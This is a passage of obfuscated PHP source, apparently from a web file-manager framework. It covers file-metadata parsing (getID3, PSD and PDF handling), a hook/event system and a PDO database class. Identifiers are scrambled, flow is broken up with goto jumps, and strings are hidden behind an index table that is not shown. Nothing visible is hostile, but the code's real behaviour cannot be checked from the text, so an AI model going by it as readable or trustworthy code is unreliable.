get($DüÈ√££Î”) { $bﬂÇ‚‹·Ωè = IO::info($DüÈ√££Î”); return self::infoAdd($bﬂÇ‚‹·Ωè); } public static function infoAdd(&$D‘Èˆíÿª•) { goto bâµëÌ®≈‡; C“Ü´ÌﬁèÉ: $DÉ¬îªé‹‹[$cÛçÖËÃ„™[369]] = $EÍÌöì±Ôç; $D‘Èˆíÿª•[$cÛçÖËÃ„™[422]] = $DÉ¬îªé‹‹; return $D‘Èˆíÿª•; goto e›¬ÎÂŒêÙ; Cöê“Çı‰ë: if (!$D‘Èˆíÿª• || $D‘Èˆíÿª•[$cÛçÖËÃ„™[29]] != $cÛçÖËÃ„™[164]) { return; } if (!self::support($D‘Èˆíÿª•[$cÛçÖËÃ„™[157]]) || isset($D‘Èˆíÿª•[$cÛçÖËÃ„™[422]])) { return; } $CÎ‘ù—ã†Ú = $cÛçÖËÃ„™[1589] . $D‘Èˆíÿª•[$cÛçÖËÃ„™[75]]; goto a≥≥›¶¯œ‰; bâµëÌ®≈‡: $cÛçÖËÃ„™ =& $_SERVER[—Ω]; static $eôª∞∂ãÿ⁄; if (!$eôª∞∂ãÿ⁄) { require SDK_DIR . $cÛçÖËÃ„™[1588]; $eôª∞∂ãÿ⁄ = new getID3(); } goto Cöê“Çı‰ë; a≥≥›¶¯œ‰: $EÍÌöì±Ôç = $D‘Èˆíÿª•[$cÛçÖËÃ„™[157]]; try { if ($D‘Èˆíÿª•[$cÛçÖËÃ„™[157]] == $cÛçÖËÃ„™[1590]) { $DÉ¬îªé‹‹ = self::psdParse($CÎ‘ù—ã†Ú); $EÍÌöì±Ôç = $cÛçÖËÃ„™[1591]; } else { if ($D‘Èˆíÿª•[$cÛçÖËÃ„™[157]] == $cÛçÖËÃ„™[1592]) { $DÉ¬îªé‹‹ = self::pdfParse($CÎ‘ù—ã†Ú); } else { $EÍÌöì±Ôç = self::$fileTypeArray[$cÛçÖËÃ„™[1593]][$D‘Èˆíÿª•[$cÛçÖËÃ„™[157]]]; $C÷ˆß†ß≤ = self::$fileTypeArray[$cÛçÖËÃ„™[1594]][$EÍÌöì±Ôç][$cÛçÖËÃ„™[1595]]; $D€ß™ºêÊ¢ = @$eôª∞∂ãÿ⁄->analyze($CÎ‘ù—ã†Ú, $D‘Èˆíÿª•[$cÛçÖËÃ„™[77]], $D‘Èˆíÿª•[$cÛçÖËÃ„™[28]]); $DÉ¬îªé‹‹ = self::parseData($D€ß™ºêÊ¢, $C÷ˆß†ß≤, $D‘Èˆíÿª•); } } } catch (Exception $D”ˆ¢Íá¥) { $DÉ¬îªé‹‹ = array($cÛçÖËÃ„™[369] => $EÍÌöì±Ôç); } if (!$DÉ¬îªé‹‹) { return; } goto C“Ü´ÌﬁèÉ; e›¬ÎÂŒêÙ: } public static function support($DªÙÆôΩÖ«) { goto fí˜ø¶áÂƒ; eãó≥¨Æ—è: $dÛæÆ¢ÉöÚ = array($d˜≈≈«úâè[1592], $d˜≈≈«úâè[1590]); if (in_array($DªÙÆôΩÖ«, $dÛæÆ¢ÉöÚ)) { return !0; } if (isset(self::$fileTypeArray[$d˜≈≈«úâè[1593]][$DªÙÆôΩÖ«])) { return !0; } goto E—¥ìöÓ”¡; fí˜ø¶áÂƒ: $d˜≈≈«úâè =& $_SERVER[—Ω]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $DªÙÆôΩÖ« = strtolower($DªÙÆôΩÖ«); goto eãó≥¨Æ—è; E—¥ìöÓ”¡: return !1; goto C‘Âíå÷Úè; C‘Âíå÷Úè: } private static function parseData($C íÖÓ©ﬂî, $dÙ„µ—«Ò, $bè¥¢ÍÑ≤î) { $bªÙÿìöÎÏ =& $_SERVER[—Ω]; $A›öãÀ´ ¨ = $C íÖÓ©ﬂî[$bªÙÿìöÎÏ[1596]]; $aÛ©âÓá≈• = array(); foreach ($dÙ„µ—«Ò as $a‘€æ˘Öﬁ˜ => $còƒªÉ“Ê¢) { foreach ($còƒªÉ“Ê¢ as $d‹æç∫⁄Ç…) { if (is_array($d‹æç∫⁄Ç…)) { $d∂´àì£√π = self::parseData($C íÖÓ©ﬂî, $còƒªÉ“Ê¢, $bè¥¢ÍÑ≤î); if ($d∂´àì£√π) { $aÛ©âÓá≈•[$a‘€æ˘Öﬁ˜] = $d∂´àì£√π; } break; } $f≤áßË∫§® = str_replace($bªÙÿìöÎÏ[1370], $A›öãÀ´ ¨, $d‹æç∫⁄Ç…); $d∂´àì£√π = _get($C íÖÓ©ﬂî, $f≤áßË∫§®); $d∂´àì£√π = is_array($d∂´àì£√π) ? $d∂´àì£√π[0] : $d∂´àì£√π; if ($d∂´àì£√π) { break; } } if ($d∂´àì£√π || $d∂´àì£√π === 0 || $d∂´àì£√π === !1) { $d∂´àì£√π = self::valueReset($d‹æç∫⁄Ç…, $d∂´àì£√π, $a‘€æ˘Öﬁ˜); if ($d∂´àì£√π !== null) { $aÛ©âÓá≈•[$a‘€æ˘Öﬁ˜] = $d∂´àì£√π; } } } $aÛ©âÓá≈• = self::valueResetAll($aÛ©âÓá≈•, $bè¥¢ÍÑ≤î); return $aÛ©âÓá≈•; } private static function psdParse($cóò…Áµ›ç) { $A“©±ÚçôÓ =& $_SERVER[—Ω]; if (IO::fileSubstr($cóò…Áµ›ç, 0, 4) != $A“©±ÚçôÓ[1597]) { return !1; } $dáûÛ›ÑÈà = getImageSize($cóò…Áµ›ç, $e¨™âàÀÃ˜); if (!$dáûÛ›ÑÈà) { return; } $e˜ÁÖôÑ¿∫ = array($A“©±ÚçôÓ[1512] => $dáûÛ›ÑÈà[0], $A“©±ÚçôÓ[1514] => $dáûÛ›ÑÈà[1]); return $e˜ÁÖôÑ¿∫; } private static function pdfParse($AËäΩ◊èÆ ) { return FileParsePdf::parse($AËäΩ◊èÆ ); } private static function fileTypeParse() { $Câ–µ©∫ò´ =& $_SERVER[—Ω]; $Aµ¥´„åï‚ = self::fileTypeArray(); $fà≠Áâ˘‰Ñ = array(); foreach ($Aµ¥´„åï‚ as $e‚Ñá∫ ‰ë => $bÑ⁄ÏÜïÑø) { $bº∫ä∏Ï—Ã = _get($bÑ⁄ÏÜïÑø, $Câ–µ©∫ò´[157], $Câ–µ©∫ò´[33]); $b¿¢Ú¬ ï· = is_string($bº∫ä∏Ï—Ã) ? explode($Câ–µ©∫ò´[47], $bº∫ä∏Ï—Ã) : $bº∫ä∏Ï—Ã; if (!$b¿¢Ú¬ ï·) { continue; } foreach ($b¿¢Ú¬ ï· as $bº∫ä∏Ï—Ã) { $bº∫ä∏Ï—Ã = strtolower(trim($bº∫ä∏Ï—Ã)); if (!$bº∫ä∏Ï—Ã) { continue; } $fà≠Áâ˘‰Ñ[$bº∫ä∏Ï—Ã] = $e‚Ñá∫ ‰ë; } $Aµ¥´„åï‚[$e‚Ñá∫ ‰ë][$Câ–µ©∫ò´[157]] = array_keys($fà≠Áâ˘‰Ñ); $Aµ¥´„åï‚[$e‚Ñá∫ ‰ë][$Câ–µ©∫ò´[1595]] = self::parseKeyMap($bÑ⁄ÏÜïÑø[$Câ–µ©∫ò´[1595]]); } return array($Câ–µ©∫ò´[1594] => $Aµ¥´„åï‚, $Câ–µ©∫ò´[1593] => $fà≠Áâ˘‰Ñ); } private static function parseKeyMap($dì‹§“æÆ•) { $E©ÛË¯ëâ =& $_SERVER[—Ω]; foreach ($dì‹§“æÆ• as $aê‹‚∑ÀêÖ => $DëÌÒóÏ£•) { if (is_array($DëÌÒóÏ£•)) { $bƒ¬Ô—‹∆Ê = self::parseKeyMap($DëÌÒóÏ£•); if ($bƒ¬Ô—‹∆Ê) { $dì‹§“æÆ•[$aê‹‚∑ÀêÖ] = $bƒ¬Ô—‹∆Ê; } continue; } $cÉ∞Õ‘û™Ö = explode($E©ÛË¯ëâ[47], $DëÌÒóÏ£•); $bíàû†ëãÛ = array(); foreach ($cÉ∞Õ‘û™Ö as $AÏû®ÿ”ï„) { $AÏû®ÿ”ï„ = trim($AÏû®ÿ”ï„); if (!$AÏû®ÿ”ï„) { continue; } if (preg_match($E©ÛË¯ëâ[1598], $AÏû®ÿ”ï„, $aÙé†ìÊÃÕ)) { $C∂§Î¿´áÌ = explode($E©ÛË¯ëâ[268], $aÙé†ìÊÃÕ[1]); foreach ($C∂§Î¿´áÌ as $DˆÖÜÁŸ”î) { $bíàû†ëãÛ[] = str_replace($aÙé†ìÊÃÕ[0], $DˆÖÜÁŸ”î, $AÏû®ÿ”ï„); } } else { $bíàû†ëãÛ[] = $AÏû®ÿ”ï„; } } $dì‹§“æÆ•[$aê‹‚∑ÀêÖ] = $bíàû†ëãÛ; } return $dì‹§“æÆ•; } private static function valueResetAll($a«’©ÚáÆê, $BÒÑÊ˘£–…) { goto b¥öÂ§òùÇ; EÀÃå≈ªÒÈ: $e∫‡«∑…çº = _get($a«’©ÚáÆê, $FˆﬂÜ¡ÔéÆ[1611], $FˆﬂÜ¡ÔéÆ[33]); $C´ πíå·º = $CïÃäÁïªò . $e≤É◊ü£©Ó . $e∫‡«∑…çº; if ($C´ πíå·º && get_charset($C´ πíå·º) != $FˆﬂÜ¡ÔéÆ[323]) { $a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1608]][$FˆﬂÜ¡ÔéÆ[1325]] = iconv_to($a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1608]][$FˆﬂÜ¡ÔéÆ[1325]], get_charset($C´ πíå·º), $FˆﬂÜ¡ÔéÆ[323]); $a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1608]][$FˆﬂÜ¡ÔéÆ[1612]] = iconv_to($a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1608]][$FˆﬂÜ¡ÔéÆ[1612]], get_charset($C´ πíå·º), $FˆﬂÜ¡ÔéÆ[323]); $a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1608]][$FˆﬂÜ¡ÔéÆ[1613]] = iconv_to($a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1608]][$FˆﬂÜ¡ÔéÆ[1613]], get_charset($C´ πíå·º), $FˆﬂÜ¡ÔéÆ[323]); } goto Fâ‘ã’™©ÿ; b¥öÂ§òùÇ: $FˆﬂÜ¡ÔéÆ =& $_SERVER[—Ω]; if (isset($a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1599]])) { $C”ÆÆ≥Ö˜û = ceil($a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1599]]); $cÌÖ∂ÉÁœ§ = intval($C”ÆÆ≥Ö˜û / 3600); $f‹ã∂Èó“© = intval(($C”ÆÆ≥Ö˜û - $cÌÖ∂ÉÁœ§ * 3600) / 60); $C¡ÇÈµÓå¯ = $C”ÆÆ≥Ö˜û % 60; $a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1600]] = sprintf($FˆﬂÜ¡ÔéÆ[1601], $cÌÖ∂ÉÁœ§, $f‹ã∂Èó“©, $C¡ÇÈµÓå¯); if ($cÌÖ∂ÉÁœ§ == 0) { $a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1600]] = sprintf($FˆﬂÜ¡ÔéÆ[1602], $f‹ã∂Èó“©, $C¡ÇÈµÓå¯); } } $AΩ≤ªº’é‡ = _get($a«’©ÚáÆê, $FˆﬂÜ¡ÔéÆ[1603]); goto B∆¿ﬁ¢ãÂÛ; B∆¿ﬁ¢ãÂÛ: if ($AΩ≤ªº’é‡) { $AÍÁ®’⁄Â∑ = IO_PATH_SYSTEM_TEMP . $FˆﬂÜ¡ÔéÆ[1604] . KodIO::hashPath($BÒÑÊ˘£–…) . $FˆﬂÜ¡ÔéÆ[1605]; $a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1606]] = Action($FˆﬂÜ¡ÔéÆ[1607])->pluginCacheFileSet($AÍÁ®’⁄Â∑, $AΩ≤ªº’é‡); unset($a«’©ÚáÆê[$FˆﬂÜ¡ÔéÆ[1608]][$FˆﬂÜ¡ÔéÆ[1591]]); } $CïÃäÁïªò = _get($a«’©ÚáÆê, $FˆﬂÜ¡ÔéÆ[1609], $FˆﬂÜ¡ÔéÆ[33]); $e≤É◊ü£©Ó = _get($a«’©ÚáÆê, $FˆﬂÜ¡ÔéÆ[1610], $FˆﬂÜ¡ÔéÆ[33]); goto EÀÃå≈ªÒÈ; Fâ‘ã’™©ÿ: return $a«’©ÚáÆê; goto e°Í∆ˆßÔÓ; e°Í∆ˆßÔÓ: } private static function valueReset($f∆…îß∆¡Ú, $Cú ®»Ë•∫, $d›Â»Æù”ƒ) { $b‚êæ¡Ô‚Ê =& $_SERVER[—Ω]; $cîàëœùì = $b‚êæ¡Ô‚Ê[1529]; switch ($f∆…îß∆¡Ú) { case $b‚êæ¡Ô‚Ê[1614]: $Cú ®»Ë•∫ = $Cú ®»Ë•∫ == $b‚êæ¡Ô‚Ê[83] ? $b‚êæ¡Ô‚Ê[1615] : $b‚êæ¡Ô‚Ê[1616]; break; case $b‚êæ¡Ô‚Ê[1617]: $Cú ®»Ë•∫ = $Cú ®»Ë•∫ ? $Cú ®»Ë•∫ : null; break; default: break; } switch ($d›Â»Æù”ƒ) { case $b‚êæ¡Ô‚Ê[1618]: $Cú ®»Ë•∫ = round($Cú ®»Ë•∫, 2); break; case $b‚êæ¡Ô‚Ê[184]: case $b‚êæ¡Ô‚Ê[107]: if ($Cú ®»Ë•∫ < 0) { $Cú ®»Ë•∫ = null; } else { if (is_numeric($Cú ®»Ë•∫)) { $Cú ®»Ë•∫ = date($cîàëœùì, $Cú ®»Ë•∫); } } break; default: break; } return $Cú ®»Ë•∫; } private static function fileTypeArray() { $c”¯Ë«°ƒ— =& $_SERVER[—Ω]; return array($c”¯Ë«°ƒ—[1591] => array($c”¯Ë«°ƒ—[157] => $c”¯Ë«°ƒ—[1619] . $c”¯Ë«°ƒ—[1620], $c”¯Ë«°ƒ—[1595] => array($c”¯Ë«°ƒ—[1512] => $c”¯Ë«°ƒ—[1621], $c”¯Ë«°ƒ—[1514] => $c”¯Ë«°ƒ—[1622], $c”¯Ë«°ƒ—[1623] => $c”¯Ë«°ƒ—[1624], $c”¯Ë«°ƒ—[1625] => $c”¯Ë«°ƒ—[1626], $c”¯Ë«°ƒ—[184] => $c”¯Ë«°ƒ—[1627], $c”¯Ë«°ƒ—[107] => $c”¯Ë«°ƒ—[1628], $c”¯Ë«°ƒ—[1629] => $c”¯Ë«°ƒ—[1630], $c”¯Ë«°ƒ—[1631] => $c”¯Ë«°ƒ—[1632], $c”¯Ë«°ƒ—[1633] => $c”¯Ë«°ƒ—[1634], $c”¯Ë«°ƒ—[1635] => $c”¯Ë«°ƒ—[1636], $c”¯Ë«°ƒ—[1637] => $c”¯Ë«°ƒ—[1638], $c”¯Ë«°ƒ—[1639] => $c”¯Ë«°ƒ—[1640], $c”¯Ë«°ƒ—[1641] => $c”¯Ë«°ƒ—[1642], $c”¯Ë«°ƒ—[1643] => array($c”¯Ë«°ƒ—[1644] => $c”¯Ë«°ƒ—[1645], $c”¯Ë«°ƒ—[1646] => $c”¯Ë«°ƒ—[1647], $c”¯Ë«°ƒ—[1648] => $c”¯Ë«°ƒ—[1649]), $c”¯Ë«°ƒ—[1650] => $c”¯Ë«°ƒ—[1651], $c”¯Ë«°ƒ—[1652] => $c”¯Ë«°ƒ—[1653], $c”¯Ë«°ƒ—[1654] => $c”¯Ë«°ƒ—[1655], $c”¯Ë«°ƒ—[1656] => $c”¯Ë«°ƒ—[1657], $c”¯Ë«°ƒ—[1658] => array($c”¯Ë«°ƒ—[1659] => $c”¯Ë«°ƒ—[1660], $c”¯Ë«°ƒ—[1661] => $c”¯Ë«°ƒ—[1662], $c”¯Ë«°ƒ—[1663] => $c”¯Ë«°ƒ—[1664], $c”¯Ë«°ƒ—[1665] => $c”¯Ë«°ƒ—[1666], $c”¯Ë«°ƒ—[1667] => $c”¯Ë«°ƒ—[1668], $c”¯Ë«°ƒ—[1669] => $c”¯Ë«°ƒ—[1670], $c”¯Ë«°ƒ—[1671] => $c”¯Ë«°ƒ—[1672], $c”¯Ë«°ƒ—[1673] => $c”¯Ë«°ƒ—[1674], $c”¯Ë«°ƒ—[1675] => $c”¯Ë«°ƒ—[1676], $c”¯Ë«°ƒ—[1677] => $c”¯Ë«°ƒ—[1678], $c”¯Ë«°ƒ—[1679] => $c”¯Ë«°ƒ—[1680]))), $c”¯Ë«°ƒ—[1681] => array($c”¯Ë«°ƒ—[157] => $c”¯Ë«°ƒ—[1682] . $c”¯Ë«°ƒ—[1683], $c”¯Ë«°ƒ—[1595] => array($c”¯Ë«°ƒ—[1599] => $c”¯Ë«°ƒ—[1684], $c”¯Ë«°ƒ—[184] => $c”¯Ë«°ƒ—[1685], $c”¯Ë«°ƒ—[107] => $c”¯Ë«°ƒ—[1686], $c”¯Ë«°ƒ—[1631] => $c”¯Ë«°ƒ—[1687], $c”¯Ë«°ƒ—[1688] => $c”¯Ë«°ƒ—[1689], $c”¯Ë«°ƒ—[1690] => $c”¯Ë«°ƒ—[1617], $c”¯Ë«°ƒ—[1691] => $c”¯Ë«°ƒ—[1692], $c”¯Ë«°ƒ—[1693] => $c”¯Ë«°ƒ—[1694], $c”¯Ë«°ƒ—[1695] => $c”¯Ë«°ƒ—[1696], $c”¯Ë«°ƒ—[1608] => array($c”¯Ë«°ƒ—[1325] => $c”¯Ë«°ƒ—[1697], $c”¯Ë«°ƒ—[1612] => $c”¯Ë«°ƒ—[1698], $c”¯Ë«°ƒ—[1613] => $c”¯Ë«°ƒ—[1699], $c”¯Ë«°ƒ—[1700] => $c”¯Ë«°ƒ—[1701], $c”¯Ë«°ƒ—[1702] => $c”¯Ë«°ƒ—[1703], $c”¯Ë«°ƒ—[1704] => $c”¯Ë«°ƒ—[1705], $c”¯Ë«°ƒ—[1591] => $c”¯Ë«°ƒ—[1706]))), $c”¯Ë«°ƒ—[1707] => array($c”¯Ë«°ƒ—[157] => $c”¯Ë«°ƒ—[1708] . $c”¯Ë«°ƒ—[1709], $c”¯Ë«°ƒ—[1595] => array($c”¯Ë«°ƒ—[1512] => $c”¯Ë«°ƒ—[1710], $c”¯Ë«°ƒ—[1514] => $c”¯Ë«°ƒ—[1711], $c”¯Ë«°ƒ—[1599] => $c”¯Ë«°ƒ—[1684], $c”¯Ë«°ƒ—[184] => $c”¯Ë«°ƒ—[1712], $c”¯Ë«°ƒ—[107] => $c”¯Ë«°ƒ—[1713], $c”¯Ë«°ƒ—[1618] => $c”¯Ë«°ƒ—[1714], $c”¯Ë«°ƒ—[1695] => $c”¯Ë«°ƒ—[1715], $c”¯Ë«°ƒ—[1691] => $c”¯Ë«°ƒ—[1716], $c”¯Ë«°ƒ—[1631] => $c”¯Ë«°ƒ—[1717], $c”¯Ë«°ƒ—[1681] => array($c”¯Ë«°ƒ—[1690] => $c”¯Ë«°ƒ—[1617], $c”¯Ë«°ƒ—[1718] => $c”¯Ë«°ƒ—[1719], $c”¯Ë«°ƒ—[1688] => $c”¯Ë«°ƒ—[1689], $c”¯Ë«°ƒ—[1695] => $c”¯Ë«°ƒ—[1696], $c”¯Ë«°ƒ—[1691] => $c”¯Ë«°ƒ—[1720], $c”¯Ë«°ƒ—[1693] => $c”¯Ë«°ƒ—[1694]))), $c”¯Ë«°ƒ—[1721] => array($c”¯Ë«°ƒ—[1595] => array($c”¯Ë«°ƒ—[1722] => $c”¯Ë«°ƒ—[1723], $c”¯Ë«°ƒ—[1724] => $c”¯Ë«°ƒ—[1725])), $c”¯Ë«°ƒ—[1726] => array($c”¯Ë«°ƒ—[1595] => array())); } } class Hook { private static $events = array(); public static function get($aª‰œ±—ü™ = false) { if (!$aª‰œ±—ü™) { return self::$events; } else { return self::$events[$aª‰œ±—ü™]; } } public static function apply($bÇ⁄≤≥ﬁ£ª, $Fûêœ∫´µƒ = array()) { $cœÉà⁄…áÛ = ActionApply($bÇ⁄≤≥ﬁ£ª, $Fûêœ∫´µƒ); if (is_string($bÇ⁄≤≥ﬁ£ª)) { Hook::trigger($bÇ⁄≤≥ﬁ£ª); } return $cœÉà⁄…áÛ; } public static function bind($e∞™ÀèÚßË, $aÆù‘—Êëï, $bÑÍﬂÇ‚é = false) { $bÙÁã¥Ó§û =& $_SERVER[—Ω]; if (!isset(self::$events[$e∞™ÀèÚßË])) { self::$events[$e∞™ÀèÚßË] = array(); } self::$events[$e∞™ÀèÚßË][] = array($bÙÁã¥Ó§û[1727] => $aÆù‘—Êëï, $bÙÁã¥Ó§û[1728] => $bÑÍﬂÇ‚é, $bÙÁã¥Ó§û[1729] => 0); } public static function once($eÓÛ¢í£É∆, $d‘ ‘ÉÙê˜) { self::bind($eÓÛ¢í£É∆, $d‘ ‘ÉÙê˜, !0); } public static function unbind($f≥ÇÎûÍ‰€, $b¿Ü…ËÊ∞Û = false) { if (!$b¿Ü…ËÊ∞Û) { self::$events[$f≥ÇÎûÍ‰€] = array(); return; } $A√öËòŸÚ± = self::$events[$f≥ÇÎûÍ‰€]; self::$events[$f≥ÇÎûÍ‰€] = array(); if (!is_array($A√öËòŸÚ±)) { return; } for ($DÊ∞∏ã†êˆ = 0; $DÊ∞∏ã†êˆ < count($A√öËòŸÚ±); $DÊ∞∏ã†êˆ++) { if ($A√öËòŸÚ±[$DÊ∞∏ã†êˆ][$_SERVER[—Ω][1727]] == $b¿Ü…ËÊ∞Û) { continue; } self::$events[$f≥ÇÎûÍ‰€][] = $A√öËòŸÚ±[$DÊ∞∏ã†êˆ]; } } public static function filter($fäüøèå¬„, $d≠¥øÒ÷í≠) { goto dŒâß´Ü™ß; Bßàô∆∆ñÎ: for ($eóÌ∂ë◊Âì = 0; $eóÌ∂ë◊Âì < count($A›…”Í¨úŒ); $eóÌ∂ë◊Âì++) { $d÷ÉßÃÍ¨º = $A›…”Í¨úŒ[$eóÌ∂ë◊Âì]; if ($d÷ÉßÃÍ¨º[$f”Ã÷∞èè©[1728]] && $d÷ÉßÃÍ¨º[$f”Ã÷∞èè©[1729]] > 1) { continue; } self::$events[$fäüøèå¬„][$eóÌ∂ë◊Âì][$f”Ã÷∞èè©[1729]] = $d÷ÉßÃÍ¨º[$f”Ã÷∞èè©[1729]] + 1; $DÕƒõßÀÒè = self::apply($d÷ÉßÃÍ¨º[$f”Ã÷∞èè©[1727]], array($fÜ€◊âﬁÎ¨)); if (!is_null($DÕƒõßÀÒè)) { $fÜ€◊âﬁÎ¨ = $DÕƒõßÀÒè; } } return $fÜ€◊âﬁÎ¨; goto B¿ã∆ç‘Â¥; bµ†â‰ëöú: $A›…”Í¨úŒ = $B¢πî∆ıÜ‰[$fäüøèå¬„]; $fÜ€◊âﬁÎ¨ = $d≠¥øÒ÷í≠; if (!is_array($A›…”Í¨úŒ) || count($A›…”Í¨úŒ) == 0) { return $fÜ€◊âﬁÎ¨; } goto Bßàô∆∆ñÎ; dŒâß´Ü™ß: $f”Ã÷∞èè© =& $_SERVER[—Ω]; $B¢πî∆ıÜ‰ = self::$events; if (!isset($B¢πî∆ıÜ‰[$fäüøèå¬„])) { return $d≠¥øÒ÷í≠; } goto bµ†â‰ëöú; B¿ã∆ç‘Â¥: } public static function trigger($aà±âÚﬁÜÛ) { goto eà√ºÓõù∞; bﬂè˜Í‹Ç¡: $e¨ﬁÁìª´∆ = func_get_args(); array_shift($e¨ﬁÁìª´∆); for ($A¯ÓÃ†É£Ò = 0; $A¯ÓÃ†É£Ò < count($CÎ≈Í“ÿ·ê); $A¯ÓÃ†É£Ò++) { $E∏€°œ¢©™ = $CÎ≈Í“ÿ·ê[$A¯ÓÃ†É£Ò]; if ($E∏€°œ¢©™[$cÔ“€˘„—à[1728]] && $E∏€°œ¢©™[$cÔ“€˘„—à[1729]] > 1) { continue; } if (defined($cÔ“€˘„—à[1730]) && GLOBAL_LOG_HOOK) { write_log($aà±âÚﬁÜÛ . $cÔ“€˘„—à[1731] . $E∏€°œ¢©™[$cÔ“€˘„—à[1727]], $cÔ“€˘„—à[1732]); } self::$events[$aà±âÚﬁÜÛ][$A¯ÓÃ†É£Ò][$cÔ“€˘„—à[1729]] = $E∏€°œ¢©™[$cÔ“€˘„—à[1729]] + 1; $C°ï∑˘õ‰ = self::apply($E∏€°œ¢©™[$cÔ“€˘„—à[1727]], $e¨ﬁÁìª´∆); if (defined($cÔ“€˘„—à[1730]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $cÔ“€˘„—à[1732]); if ($E∏€°œ¢©™[$cÔ“€˘„—à[1729]] == 200) { $añå’–ê™Õ = is_array($E∏€°œ¢©™[$cÔ“€˘„—à[1727]]) ? json_encode_force($E∏€°œ¢©™[$cÔ“€˘„—à[1727]]) : $E∏€°œ¢©™[$cÔ“€˘„—à[1727]]; write_log($cÔ“€˘„—à[1733] . $aà±âÚﬁÜÛ . $cÔ“€˘„—à[1734] . $añå’–ê™Õ, $cÔ“€˘„—à[1735]); } } $a’˜Ø†∫ª‚ = is_null($C°ï∑˘õ‰) ? $a’˜Ø†∫ª‚ : $C°ï∑˘õ‰; } goto e‰ãÎÍ∑¢€; e‰ãÎÍ∑¢€: return $a’˜Ø†∫ª‚; goto DØûãÂ»Ñı; eà√ºÓõù∞: $cÔ“€˘„—à =& $_SERVER[—Ω]; $BëôÜ…≤∞π = self::$events; $a’˜Ø†∫ª‚ = !1; goto F√«à–ÒÀ; F√«à–ÒÀ: if (!isset($BëôÜ…≤∞π[$aà±âÚﬁÜÛ])) { return $a’˜Ø†∫ª‚; } $CÎ≈Í“ÿ·ê = $BëôÜ…≤∞π[$aà±âÚﬁÜÛ]; if (!is_array($CÎ≈Í“ÿ·ê) || count($CÎ≈Í“ÿ·ê) == 0) { return $a’˜Ø†∫ª‚; } goto bﬂè˜Í‹Ç¡; DØûãÂ»Ñı: } } goto Eøœ¬ÑßÇ‡; AïúãÆÙËñ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($F˘ÿ«∑Ùˆ€ = '') { $b‚‹ ≈¶∏ä =& $_SERVER[—Ω]; if (!class_exists($b‚‹ ≈¶∏ä[831])) { think_exception(think_lang($b‚‹ ≈¶∏ä[10]) . $b‚‹ ≈¶∏ä[832]); } if (!empty($F˘ÿ«∑Ùˆ€)) { $this->config = $F˘ÿ«∑Ùˆ€; if (empty($this->config[$b‚‹ ≈¶∏ä[13]])) { $this->config[$b‚‹ ≈¶∏ä[13]] = array(); } } } public function connect($EÌêÉ†é¢È = '', $bÈﬂÑ¶ì§ç = 0) { $AêîØë≈ÁÜ =& $_SERVER[—Ω]; if (!isset($this->linkID[$bÈﬂÑ¶ì§ç])) { goto c¶úêÜºÀû; c¶úêÜºÀû: if (empty($EÌêÉ†é¢È)) { $EÌêÉ†é¢È = $this->config; } if ($this->pconnect) { $EÌêÉ†é¢È[$AêîØë≈ÁÜ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$bÈﬂÑ¶ì§ç] = new PDO($EÌêÉ†é¢È[$AêîØë≈ÁÜ[833]], $EÌêÉ†é¢È[$AêîØë≈ÁÜ[806]], $EÌêÉ†é¢È[$AêîØë≈ÁÜ[807]], $EÌêÉ†é¢È[$AêîØë≈ÁÜ[13]]); } catch (PDOException $DÒ§ì”Óùï) { think_exception($DÒ§ì”Óùï->getMessage()); } goto Bø©ë‘Æ®◊; Bø©ë‘Æ®◊: $this->dbType = $this->_getDsnType($EÌêÉ†é¢È[$AêîØë≈ÁÜ[833]]); if (in_array($this->dbType, array($AêîØë≈ÁÜ[834], $AêîØë≈ÁÜ[835], $AêîØë≈ÁÜ[836], $AêîØë≈ÁÜ[837]))) { think_exception($AêîØë≈ÁÜ[838] . $this->dbType . $AêîØë≈ÁÜ[839] . $this->dbType . $AêîØë≈ÁÜ[840]); } if (!$this->linkID[$bÈﬂÑ¶ì§ç]) { think_exception($AêîØë≈ÁÜ[841]); } goto AÒ≠ õóÑÊ; AÒ≠ õóÑÊ: $this->linkID[$bÈﬂÑ¶ì§ç]->exec($AêîØë≈ÁÜ[842] . think_config($AêîØë≈ÁÜ[809])); $this->connected = !0; if (1 != think_config($AêîØë≈ÁÜ[18])) { unset($this->config); } goto Cˆ åØ÷Ÿ‹; Cˆ åØ÷Ÿ‹: } return $this->linkID[$bÈﬂÑ¶ì§ç]; } public function free() { $this->PDOStatement = null; } public function query($eá¯µ˜πî¿, $b¥≥êõî»± = array()) { goto C“œ™Ê´Ÿı; C“œ™Ê´Ÿı: $BÓº˜ãÑñ⁄ =& $_SERVER[—Ω]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÖç¶âñæã; EÖç¶âñæã: $this->queryStr = $eá¯µ˜πî¿; if (!empty($b¥≥êõî»±)) { $this->queryStr .= $BÓº˜ãÑñ⁄[843] . print_r($b¥≥êõî»±, !0) . $BÓº˜ãÑñ⁄[844]; } if (!empty($this->PDOStatement)) { $this->free(); } goto cÛÇ¬†Ÿ¥«; b˜™ÒÕùÁ¯: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Eÿ¢âáä»„ = $this->PDOStatement->execute($b¥≥êõî»±); $this->debug(); goto AÉ≥ã«™±Ø; cÛÇ¬†Ÿ¥«: think_action_status($BÓº˜ãÑñ⁄[19], 1); think_status($BÓº˜ãÑñ⁄[20]); $this->PDOStatement = $this->_linkID->prepare($eá¯µ˜πî¿); goto b˜™ÒÕùÁ¯; AÉ≥ã«™±Ø: if (!1 === $Eÿ¢âáä»„) { $this->error(); return !1; } else { return $this->getAll(); } goto C“¶’Ù˜˜Á; C“¶’Ù˜˜Á: } public function execute($bËÍà‘âêâ, $c∑îöÈàËÎ = array()) { goto B”∞êåÁ™à; aãﬁ¥ıûÊ: $this->queryStr = $bËÍà‘âêâ; if (!empty($c∑îöÈàËÎ)) { 